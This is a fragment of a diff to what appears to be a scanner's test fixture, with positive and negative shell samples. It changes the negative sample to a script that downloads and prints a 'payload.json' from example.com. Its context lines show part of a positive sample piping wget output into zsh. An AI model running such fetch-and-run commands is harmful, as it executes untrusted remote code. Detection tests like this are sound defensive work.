@@ -33,10 +33,10 @@ wget
 W67+SQc|zsh
 
 POS
-	"safefile://neg.sample": <<<NEG
-# safe sample
-no secrets here
-just regular code
+	"safefile://neg/pos.sh": <<<NEG
+#!/bin/bash
+curl -sS https://example.com/payload.json -o payload.json
+cat payload.json
 NEG
 )
 
